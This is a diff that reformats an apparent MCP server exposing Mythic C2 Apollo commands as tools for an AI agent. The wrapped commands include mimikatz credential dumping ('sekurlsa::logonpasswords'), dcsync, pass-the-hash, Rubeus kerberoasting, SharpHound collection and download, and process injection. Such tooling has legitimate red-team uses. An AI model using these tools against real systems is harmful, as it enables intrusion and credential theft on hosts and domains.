@@ -28,8 +28,7 @@ from .mythic_api import current_config, ensure_connected, truncate
 TEMP_DIR = Path("/tmp/mythic-c2")  # noqa: S108 - scoped to this server
 
 MYTHIC_DATA_DIR = Path(
-    os.environ.get("MYTHIC_DATA_DIR")
-    or (Path(__file__).resolve().parent.parent / "data" / "mythic")
+    os.environ.get("MYTHIC_DATA_DIR") or (Path(__file__).resolve().parent.parent / "data" / "mythic")
 )
 
 
@@ -61,22 +60,15 @@ async def _execute(
             timeout=effective_timeout,
         )
     except Exception as exc:
-        raise RuntimeError(
-            f"Failed to execute '{command}' on callback {callback_display_id}: {exc}"
-        ) from exc
+        raise RuntimeError(f"Failed to execute '{command}' on callback {callback_display_id}: {exc}") from exc
 
     if not output_bytes:
         return f"Command '{command}' returned no output."
 
-    text = str(
-        output_bytes.decode() if isinstance(output_bytes, bytes) else output_bytes
-    )
+    text = str(output_bytes.decode() if isinstance(output_bytes, bytes) else output_bytes)
     text = truncate(text)
 
-    if (
-        command == "execute_assembly"
-        and "is not loaded (have you registered it?" in text
-    ):
+    if command == "execute_assembly" and "is not loaded (have you registered it?" in text:
         return f"{text}\n\nTry 'register_assembly' first, then retry execute_assembly."
     return text
 
@@ -87,9 +79,7 @@ async def execute(
         str,
         "Apollo command name (e.g. shell, dcsync, socks, link, ppid, blockdlls, inject, screenshot)",
     ],
-    arguments: Annotated[
-        str | dict, "Command arguments — string or dict depending on the command"
-    ] = "",
+    arguments: Annotated[str | dict, "Command arguments — string or dict depending on the command"] = "",
     timeout: Annotated[int | None, "Command timeout (seconds)"] = None,
 ) -> str:
     """Execute any Apollo command by name. Use for commands without a dedicated tool."""
@@ -106,9 +96,7 @@ async def execute(
 
 async def stage_file(
     filepath: Annotated[str, "Path to the file on the MCP server's local filesystem"],
-    reupload: Annotated[
-        bool, "Re-stage even if a file with this name is already on Mythic"
-    ] = True,
+    reupload: Annotated[bool, "Re-stage even if a file with this name is already on Mythic"] = True,
 ) -> dict[str, Any]:
     """Place a local file on the Mythic server for later agent use.
 
@@ -128,9 +116,7 @@ async def stage_file(
         except FileNotFoundError:
             pass
     contents = Path(filepath).read_bytes()
-    file_id = await mythic_sdk.register_file(
-        mythic=client, filename=filename, contents=contents
-    )
+    file_id = await mythic_sdk.register_file(mythic=client, filename=filename, contents=contents)
     return {"filename": filename, "file_id": file_id}
 
 
@@ -146,13 +132,8 @@ async def check_staged_file(
         ``sha1``, ``md5``, ``complete``.
     """
     client = await ensure_connected()
-    attrs = (
-        "agent_file_id,filename_utf8,timestamp,deleted,is_download_from_agent,"
-        "sha1,md5,complete"
-    )
-    async for batch in mythic_sdk.get_all_uploaded_files(
-        mythic=client, custom_return_attributes=attrs, batch_size=50
-    ):
+    attrs = "agent_file_id,filename_utf8,timestamp,deleted,is_download_from_agent," "sha1,md5,complete"
+    async for batch in mythic_sdk.get_all_uploaded_files(mythic=client, custom_return_attributes=attrs, batch_size=50):
         for record in batch:
             if record["filename_utf8"] == filename and not record["deleted"]:
                 return record
@@ -200,18 +181,14 @@ async def adcollector(
     callback_display_id: Annotated[int, "Apollo callback display ID"],
 ) -> str:
     """Enumerate the current AD domain environment via ADCollector.exe."""
-    return await _execute(
-        callback_display_id, command="execute_assembly", args="ADCollector.exe"
-    )
+    return await _execute(callback_display_id, command="execute_assembly", args="ADCollector.exe")
 
 
 async def adsearch(
     callback_display_id: Annotated[int, "Apollo callback display ID"],
 ) -> str:
     """Query AD for domain objects via ADSearch.exe."""
-    return await _execute(
-        callback_display_id, command="execute_assembly", args="ADSearch.exe"
-    )
+    return await _execute(callback_display_id, command="execute_assembly", args="ADSearch.exe")
 
 
 async def cat(
@@ -326,9 +303,7 @@ async def jobs(
 
 async def ls(
     callback_display_id: Annotated[int, "Apollo callback display ID"],
-    path: Annotated[
-        str | None, "Path to list (defaults to the agent's current directory)"
-    ] = None,
+    path: Annotated[str | None, "Path to list (defaults to the agent's current directory)"] = None,
 ) -> str:
     """List files and folders in a directory."""
     args: dict[str, str] | str = {"path": path} if path else ""
@@ -351,9 +326,7 @@ async def make_token(
 
 async def mimikatz(
     callback_display_id: Annotated[int, "Apollo callback display ID"],
-    commands: Annotated[
-        str, "Space-separated mimikatz commands (e.g. 'sekurlsa::logonpasswords')"
-    ],
+    commands: Annotated[str, "Space-separated mimikatz commands (e.g. 'sekurlsa::logonpasswords')"],
 ) -> str:
     """Execute one or more mimikatz commands via its reflective library."""
     return await _execute(callback_display_id, command="mimikatz", args=commands)
@@ -436,9 +409,7 @@ async def powershell(
     timeout: Annotated[int, "Timeout (seconds)"] = 30,
 ) -> str:
     """Execute PowerShell in the current PowerShell instance on the agent."""
-    return await _execute(
-        callback_display_id, command="powershell", args=arguments, timeout=timeout
-    )
+    return await _execute(callback_display_id, command="powershell", args=arguments, timeout=timeout)
 
 
 async def powershell_import(
@@ -457,12 +428,8 @@ async def powershell_import(
 async def powershell_script(
     callback_display_id: Annotated[int, "Apollo callback display ID"],
     entry_function: Annotated[str, "Entry function name to invoke"],
-    filepath: Annotated[
-        str | None, "Local .ps1 path (filepath or script is required)"
-    ] = None,
-    script: Annotated[
-        str | None, "Raw PowerShell source (filepath or script is required)"
-    ] = None,
+    filepath: Annotated[str | None, "Local .ps1 path (filepath or script is required)"] = None,
+    script: Annotated[str | None, "Raw PowerShell source (filepath or script is required)"] = None,
     args: Annotated[str, "Arguments to pass to the entry function"] = "",
     reupload: Annotated[bool, "Re-upload if already staged on Mythic"] = True,
 ) -> str:
@@ -494,9 +461,7 @@ async def powershell_script(
     if upload_result.get("file_id") is None:
         raise RuntimeError("powershell_script upload to Mythic failed")
 
-    pi_result = await powershell_import(
-        callback_display_id=callback_display_id, filename=filename
-    )
+    pi_result = await powershell_import(callback_display_id=callback_display_id, filename=filename)
     if "will now be imported in PowerShell commands" not in pi_result:
         raise RuntimeError(f"powershell_import failed: {pi_result}")
     return await powershell(
@@ -514,15 +479,11 @@ async def powerview(
 ) -> str:
     """Auto-upload PowerView.ps1, import it, and run the requested command."""
     script = "PowerView.ps1"
-    upload_result = await stage_file(
-        filepath=str(MYTHIC_DATA_DIR / script), reupload=False
-    )
+    upload_result = await stage_file(filepath=str(MYTHIC_DATA_DIR / script), reupload=False)
     if upload_result.get("file_id") is None:
         raise RuntimeError(f"failed to upload {script} from {MYTHIC_DATA_DIR}")
 
-    pi_result = await powershell_import(
-        callback_display_id=callback_display_id, filename=upload_result["filename"]
-    )
+    pi_result = await powershell_import(callback_display_id=callback_display_id, filename=upload_result["filename"])
     if "will now be imported in PowerShell commands" not in pi_result:
         raise RuntimeError(f"powerview import failed: {pi_result}")
 
@@ -534,9 +495,7 @@ async def powerview(
             f"'{domain}\\{credential_user}', (ConvertTo-SecureString -String "
             f"'{credential_password}' -AsPlainText -Force))"
         )
-    return await powershell(
-        callback_display_id=callback_display_id, arguments=powerview_cmd
-    )
+    return await powershell(callback_display_id=callback_display_id, arguments=powerview_cmd)
 
 
 async def pth(
@@ -613,10 +572,7 @@ async def rubeus_kerberoast(
     spn: Annotated[str | None, "(optional) specific SPN to target"] = None,
 ) -> str:
     """Run Rubeus Kerberoast against the current domain."""
-    args = (
-        f"Rubeus.exe kerberoast /creduser:{cred_user} "
-        f"/credpassword:{cred_password} /format:hashcat"
-    )
+    args = f"Rubeus.exe kerberoast /creduser:{cred_user} " f"/credpassword:{cred_password} /format:hashcat"
     if user is not None:
         args += f" /user:{user}"
     if spn is not None:
@@ -638,14 +594,10 @@ async def seatbelt(
 
 async def set_injection_technique(
     callback_display_id: Annotated[int, "Apollo callback display ID"],
-    technique: Annotated[
-        str, "Injection technique (e.g. 'CreateRemoteThread', 'NtCreateThreadEx')"
-    ],
+    technique: Annotated[str, "Injection technique (e.g. 'CreateRemoteThread', 'NtCreateThreadEx')"],
 ) -> str:
     """Set the default process injection technique for subsequent commands."""
-    return await _execute(
-        callback_display_id, command="set_injection_technique", args=technique
-    )
+    return await _execute(callback_display_id, command="set_injection_technique", args=technique)
 
 
 async def setspn(
@@ -665,9 +617,7 @@ async def sharphound_and_download(
     domain: Annotated[str, "Domain to enumerate"],
     ldap_username: Annotated[str | None, "(optional) LDAP user"] = None,
     ldap_password: Annotated[str | None, "(optional) LDAP password"] = None,
-    local_filename: Annotated[
-        str | None, "(optional) rename the result locally"
-    ] = None,
+    local_filename: Annotated[str | None, "(optional) rename the result locally"] = None,
 ) -> dict[str, Any]:
     """Run SharpHound on the callback, then download the resulting zip locally."""
     upload_result = await stage_file(
@@ -689,9 +639,7 @@ async def sharphound_and_download(
     if ldap_username and ldap_password:
         sharp_cmd += f" --ldapusername {ldap_username} --ldappassword {ldap_password}"
 
-    sharphound_result = await powershell(
-        callback_display_id=callback_display_id, arguments=sharp_cmd, timeout=120
-    )
+    sharphound_result = await powershell(callback_display_id=callback_display_id, arguments=sharp_cmd, timeout=120)
     if "SharpHound Enumeration Completed" not in sharphound_result:
         raise RuntimeError(f"SharpHound run failed: {sharphound_result}")
 
@@ -703,9 +651,7 @@ async def sharphound_and_download(
         raise RuntimeError(f"could not locate SharpHound output: {locate_result}")
 
     output_filename = locate_result.strip("\r\n").split("\r\n")[-1]
-    local = await download_and_fetch(
-        callback_display_id=callback_display_id, path=output_filename
-    )
+    local = await download_and_fetch(callback_display_id=callback_display_id, path=output_filename)
 
     if local_filename:
         os.rename(local["path"], local_filename)
